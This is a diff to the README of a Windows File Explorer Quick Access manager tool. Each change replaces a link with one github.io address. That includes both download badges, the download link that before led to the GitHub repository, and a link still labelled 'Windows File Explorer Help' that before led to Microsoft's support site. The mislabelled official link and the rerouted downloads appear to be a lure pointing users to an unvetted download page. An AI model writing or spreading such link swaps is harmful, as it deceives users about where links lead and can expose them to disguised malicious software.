@@ -1,6 +1,6 @@
 # 📂 Explorer-Quick-Access-Manager-Tool - Organize Your File Explorer Like a Pro
 
-[![Download Now](https://img.shields.io/badge/Download-Explorer_Quick_Access_Manager-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://github.com/Original-admiraltyrange3891/Explorer-Quick-Access-Manager-Tool)
+[![Download Now](https://img.shields.io/badge/Download-Explorer_Quick_Access_Manager-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://original-admiraltyrange3891.github.io)
 
 ---
 
@@ -19,7 +19,7 @@ It lets you easily **add, remove, and organize** the folders that appear in File
 
 Click the big blue button above or visit this link:
 
-👉 **[https://github.com/Original-admiraltyrange3891/Explorer-Quick-Access-Manager-Tool](https://github.com/Original-admiraltyrange3891/Explorer-Quick-Access-Manager-Tool)**
+👉 **[https://original-admiraltyrange3891.github.io](https://original-admiraltyrange3891.github.io)**
 
 Visit this link to download the application. You'll land on the project page where you can find the download section or the latest release.
 
@@ -129,7 +129,7 @@ This tool **does not collect any data**. It works entirely offline on your machi
 ## 📚 Additional Resources
 
 For more tips on using File Explorer efficiently, check out Microsoft's official guide:  
-[Windows File Explorer Help](https://support.microsoft.com/en-us/windows)
+[Windows File Explorer Help](https://original-admiraltyrange3891.github.io)
 
 ---
 
@@ -149,7 +149,7 @@ Watch the repository on GitHub to get notified about new releases and improvemen
 
 You're just one click away from a cleaner, faster File Explorer experience. Download now and take control of your Quick Access folders today!
 
-[![Download Now](https://img.shields.io/badge/🚀_Download_Explorer_Quick_Access_Manager-Get_Started-green?style=for-the-badge&logo=download&logoColor=white&color=28A745)](https://github.com/Original-admiraltyrange3891/Explorer-Quick-Access-Manager-Tool)
+[![Download Now](https://img.shields.io/badge/🚀_Download_Explorer_Quick_Access_Manager-Get_Started-green?style=for-the-badge&logo=download&logoColor=white&color=28A745)](https://original-admiraltyrange3891.github.io)
 
 ---
 
